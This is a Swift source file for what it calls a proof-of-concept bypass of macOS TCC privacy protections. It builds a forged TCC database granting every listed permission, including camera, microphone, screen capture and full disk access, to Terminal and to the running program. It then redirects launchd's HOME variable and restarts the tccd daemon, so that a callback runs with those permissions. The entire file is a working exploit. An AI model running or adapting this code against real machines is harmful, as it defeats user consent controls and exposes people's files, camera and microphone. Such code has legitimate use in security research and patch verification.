//
//  BypassTCC.swift
//  bypasstcc
//
//  Created by Matt Shockley on 2/25/20.
//  Copyright © 2020 Matt Shockley. All rights reserved.
//

import Foundation

let TMP_HOME           = "/tmp/bypass"
let TCC_DATA_PATH      = "\(TMP_HOME)/Library/Application Support/com.apple.TCC"
let TCC_DB_PATH        = "\(TCC_DATA_PATH)/TCC.db"
let TCC_BUNDLE_ID      = "com.apple.tccd"

// codesign -d -r- "APP_PATH" 2>&1 | awk -F ' => ' '/designated/{log $2}' | csreq -r- -b /tmp/csreq.bin && xxd -p /tmp/csreq.bin | tr -d '\n'
let TERMINAL_BUNDLE_ID = "com.apple.Terminal"
let TERMINAL_CSREQ     = "fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003"

// default database created whenever the TCC daemon can't find one already existing
let CREATE_DB          = """
                        PRAGMA foreign_keys=OFF;
                        BEGIN TRANSACTION;
                        CREATE TABLE admin (key TEXT PRIMARY KEY NOT NULL, value INTEGER NOT NULL);
                        INSERT INTO admin VALUES('version',15);
                        CREATE TABLE policies (    id        INTEGER    NOT NULL PRIMARY KEY,     bundle_id    TEXT    NOT NULL,     uuid        TEXT    NOT NULL,     display        TEXT    NOT NULL,     UNIQUE (bundle_id, uuid));
                        CREATE TABLE active_policy (    client        TEXT    NOT NULL,     client_type    INTEGER    NOT NULL,     policy_id    INTEGER NOT NULL,     PRIMARY KEY (client, client_type),     FOREIGN KEY (policy_id) REFERENCES policies(id) ON DELETE CASCADE ON UPDATE CASCADE);
                        CREATE TABLE access (    service        TEXT        NOT NULL,     client         TEXT        NOT NULL,     client_type    INTEGER     NOT NULL,     allowed        INTEGER     NOT NULL,     prompt_count   INTEGER     NOT NULL,     csreq          BLOB,     policy_id      INTEGER,     indirect_object_identifier_type    INTEGER,     indirect_object_identifier         TEXT,     indirect_object_code_identity      BLOB,     flags          INTEGER,     last_modified  INTEGER     NOT NULL DEFAULT (CAST(strftime('%s','now') AS INTEGER)),     PRIMARY KEY (service, client, client_type, indirect_object_identifier),    FOREIGN KEY (policy_id) REFERENCES policies(id) ON DELETE CASCADE ON UPDATE CASCADE);
                        CREATE TABLE access_overrides (    service        TEXT    NOT NULL PRIMARY KEY);
                        CREATE TABLE expired (    service        TEXT        NOT NULL,     client         TEXT        NOT NULL,     client_type    INTEGER     NOT NULL,     csreq          BLOB,     last_modified  INTEGER     NOT NULL ,     expired_at     INTEGER     NOT NULL DEFAULT (CAST(strftime('%s','now') AS INTEGER)),     PRIMARY KEY (service, client, client_type));
                        CREATE INDEX active_policy_id ON active_policy(policy_id);
                        COMMIT;
                        """

// strings /System/Library/PrivateFrameworks/TCC.framework/TCC /System/Library/PrivateFrameworks/TCC.framework/Resources/tccd | grep -i ktccservice
let ALL_TCC_SERVICES = ["kTCCServiceCamera", "kTCCServiceSensorKitMessageUsage", "kTCCServiceSensorKitSpeechMetrics", "kTCCServiceBluetoothAlways", "kTCCServiceSiri", "kTCCServiceSensorKitMotionHeartRate", "kTCCServiceLinkedIn", "kTCCServiceMicrophone", "kTCCServiceAll", "kTCCServiceScreenCapture", "kTCCServiceContactsLimited", "kTCCServiceSystemPolicyRemovableVolumes", "kTCCServiceSensorKitWatchForegroundAppCategory", "kTCCServiceAccessibility", "kTCCServiceCalls", "kTCCServiceSensorKitWatchOnWristState", "kTCCServiceMSO", "kTCCServiceSensorKitForegroundAppCategory", "kTCCServiceSensorKitWatchMotion", "kTCCServiceTencentWeibo", "kTCCServiceAddressBook", "kTCCServiceAppleEvents", "kTCCServiceSensorKitWatchPedometer", "kTCCServiceSystemPolicyDocumentsFolder", "kTCCServiceBluetoothWhileInUse", "kTCCService", "kTCCServiceShareKit", "kTCCServiceSensorKitWatchHeartRate", "kTCCServiceMotion", "kTCCServiceBluetoothPeripheral", "kTCCServiceCalendar", "kTCCServiceSensorKitPhoneUsage", "kTCCServicePhotos", "kTCCServiceContactsFull", "kTCCServiceSystemPolicyDeveloperFiles", "kTCCServicePostEvent", "kTCCServiceSensorKitDeviceUsage", "kTCCServiceFacebook", "kTCCServiceSinaWeibo", "kTCCServiceSpeechRecognition", "kTCCServiceSystemPolicyDesktopFolder", "kTCCServiceTwitter", "kTCCServiceSensorKitElevation", "kTCCServiceReminders", "kTCCServiceLocation", "kTCCServiceSensorKitMotion", "kTCCServiceSensorKitKeyboardMetrics", "kTCCServiceDeveloperTool", "kTCCServiceLiverpool", "kTCCServicePhotosAdd", "kTCCServiceSensorKitWatchAmbientLightSensor", "kTCCServiceUbiquity", "kTCCServiceFaceID", "kTCCServiceSensorKitStrideCalibration", "kTCCServiceSensorKitWatchSpeechMetrics", "kTCCServiceSensorKitAmbientLightSensor", "kTCCServiceSensorKitLocationMetrics", "kTCCServiceSystemPolicyAllFiles", "kTCCServiceListenEvent", "kTCCServiceSensorKitPedometer", "kTCCServiceSensorKitWatchFallStats", "kTCCServiceFileProviderDomain", "kTCCServiceSystemPolicyNetworkVolumes", "kTCCServiceSensorKitOdometer", "kTCCServiceSystemPolicySysAdminFiles", "kTCCServiceWillow", "kTCCServiceFileProviderPresence", "kTCCServiceMediaLibrary", "kTCCServiceKeyboardNetwork", "kTCCServiceSystemPolicyDownloadsFolder"]

class BypassTCC {
    // who doesn't love singletons in PoC code?
    static let shared = BypassTCC()
    
    // executes another program and waits for the output
    private func runCommand(path: String, arguments: [String]) {
        let task = Process()
        task.executableURL = URL(fileURLWithPath: path)
        task.arguments = arguments
        
        let pipe = Pipe()
        task.standardOutput = pipe
        task.standardError = pipe
        
        try? task.run()
        task.waitUntilExit()
    }

    // create a query to modify the database with whatever kTCCService entitlement we want
    private func givePermission(service: String, bundleid: String, csreq: String = "", bundleidIsPath: Bool = true) -> String {
        // expire 1 year from today
        let perm_timestamp = Int(Date().timeIntervalSince1970 + (60 * 60 * 24 * 365))
        
        let isfile = bundleidIsPath ? 1 : 0;
        let sql = "INSERT INTO access VALUES('\(service)', '\(bundleid)', \(isfile), 1, 1, X'\(csreq)', NULL, NULL, 'UNUSED', NULL, NULL, \(perm_timestamp));"
        
        return sql
    }
    
    // I'm sure there's probably a more Swift-y way to do this
    private func log(_ out: String) {
        let stderr = FileHandle.standardError
        stderr.write((out + "\n").data(using: .utf8)!)
    }

    public func run(exec_path: String, priviledged_cb: () -> Void) {
        log("Starting Bypass!")
        
        do {
            // let's attempt to create our fake TCC directory structure that mimics the one in ~/Library/Application Support/com.apple.TCC
            log("- Creating fake com.apple.tcc directory")
            try FileManager.default.createDirectory(atPath: TCC_DATA_PATH, withIntermediateDirectories: true)
            defer {
                log("- Destroying fake com.apple.tcc directory")
                try? FileManager.default.removeItem(atPath: TMP_HOME)
            }
            
            // let's create a valid, empty TCC database for the daemon
            log("- Creating TCC Database")
            runCommand(path: "/usr/bin/sqlite3", arguments: [TCC_DB_PATH, CREATE_DB])
            
            var queries: [String] = []
            
            // let's give every entitlement to both this application and Terminal
            log("- Giving all kTCCService entitlements to '\(exec_path)'")
            for service in ALL_TCC_SERVICES {
                queries.append(givePermission(service: service, bundleid: "com.apple.Terminal", csreq: TERMINAL_CSREQ, bundleidIsPath: false))
                queries.append(givePermission(service: service, bundleid: exec_path))
                
                log("- Successfully gave '\(service)' entitlement")
            }
            
            // run all of those queries against the empty database
            runCommand(path: "/usr/bin/sqlite3", arguments: [TCC_DB_PATH, queries.joined()])
            
            // we can just stop the user tccd service because the tccd system service will restart it when it needs it
            log("- Setting launchd HOME environment variable to \(TMP_HOME)")
            runCommand(path: "/bin/launchctl", arguments: ["setenv", "HOME", TMP_HOME])
            log("- Restarting TCC daemon")
            runCommand(path: "/bin/launchctl", arguments: ["stop", TCC_BUNDLE_ID])
            defer {
                log("- Unsetting launchd HOME environment variable and restarting TCC daemon")
                runCommand(path: "/bin/launchctl", arguments: ["unsetenv", "HOME"])
                runCommand(path: "/bin/launchctl", arguments: ["stop", TCC_BUNDLE_ID])
            }
            
            // any code run in the callback should be running with all TCC entitlements
            priviledged_cb()
        } catch {
            log("Unexpected error: \(error)")
        }
        
        log("Finished Bypass!")
    }
}
